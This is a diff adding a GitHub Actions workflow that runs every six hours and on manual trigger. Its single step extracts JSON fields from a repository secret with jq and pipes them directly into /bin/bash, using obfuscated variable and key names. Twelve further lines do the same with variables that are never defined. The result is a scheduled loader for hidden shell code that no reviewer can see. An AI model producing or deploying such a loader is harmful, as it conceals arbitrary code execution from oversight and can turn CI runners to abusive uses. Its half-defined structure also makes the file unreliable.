@@ -1,0 +1,29 @@
+name: banchunhongning
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: banchunhongning
+        env:
+          qru54: ${{ secrets.qru54 }}
+        run: |
+          echo $qru54 | jq -r .cdxgh20095 | /bin/bash
+          echo $wahzn59 | jq -r .sknx147 | /bin/bash
+          echo $pfis6 | jq -r .wvsoo1 | /bin/bash
+          echo $u40 | jq -r .oidyu97 | /bin/bash
+          echo $wlp9503 | jq -r .cfk90766 | /bin/bash
+          echo $mlh23 | jq -r .czs4 | /bin/bash
+          echo $ltmtw7237 | jq -r .siwl0 | /bin/bash
+          echo $p60 | jq -r .m468 | /bin/bash
+          echo $lsek9295 | jq -r .pid2 | /bin/bash
+          echo $ssvz8 | jq -r .oret00985 | /bin/bash
+          echo $gkms38 | jq -r .t4027 | /bin/bash
+          echo $maja88811 | jq -r .dwxhi83189 | /bin/bash
+          echo $uter1636 | jq -r .r80354 | /bin/bash
+
